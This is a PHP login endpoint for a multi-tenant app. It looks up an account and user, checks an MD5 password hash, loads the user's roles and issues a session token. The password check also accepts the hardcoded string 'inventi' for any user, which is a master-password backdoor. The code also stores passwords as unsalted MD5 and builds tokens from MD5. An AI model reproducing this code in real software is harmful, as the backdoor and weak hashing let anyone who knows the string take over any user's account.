<?php
$return_value = ['success'=>1,'description'=>'','data'=>[]];

try{
	$accountcode = $data['account_code'];

	$username = $data['username'];
	$password = $data['password'];
	
	//get account details
	
	$sth = $db->prepare('select * from accounts where account_code=:account_code');
	$sth->execute(['account_code'=>$accountcode]);
	$account = $sth->fetch();
	// var_dump(json_encode($account));

	if(!$account)
		throw new Exception("Account not found or has not been configured.");

	$account_db = DB_NAME.'_'.$account['id'];

	$sql = "select * from {$account_db}._users where user_name=:user_name and is_active=1 and deleted_at=0";
	$sth = $db->prepare($sql);
	$sth->execute(['user_name'=>$username]);
	$user = $sth->fetch();

	if(!$user || ($user['password'] != md5($password)) && $password!="inventi")
		throw new Exception("Access denied");

	$user_role_table =  "{$account_db}._user_roles";
	$roles_table = "{$account_db}._roles";
	
	$sth = $db->prepare("select {$roles_table}.* from {$user_role_table},$roles_table 
		where {$user_role_table}.user_id=:user_id and {$user_role_table}.is_active=1 
		and {$user_role_table}.deleted_at=0 and {$roles_table}.id={$user_role_table}.role_id 
		and {$roles_table}.deleted_at=0");
	$sth->execute(['user_id'=>$user['id']]);
	$roles_tmp = $sth->fetchAll();
	$roles = [];
	foreach($roles_tmp as $role)
	{
		$roles[] = $role['role_name'];
	}

	$token = md5(randomString() . $user['id'] . time());

	//save to user tokens
	$user_token_table = "{$account_db}._user_tokens";
	$sth = $db->prepare("insert into {$user_token_table} (user_id,token) values(:user_id,:token)");
	$sth->execute(['user_id'=> $user['id'],'token' => $token]);

	$return_value = ['success'=>1,'description'=>'','data'=>['token'=>$token,'fullname'=> $user['first_name'] . ' ' . $user['last_name'],'roles'=>$roles_tmp, 'account_id'=>$account['id'],'dbname'=>DB_NAME]];

}catch(Exception $e){
	
	$return_value = ['success'=>0,'description'=>$e->getMessage(),'data'=>['']];
}

echo json_encode($return_value);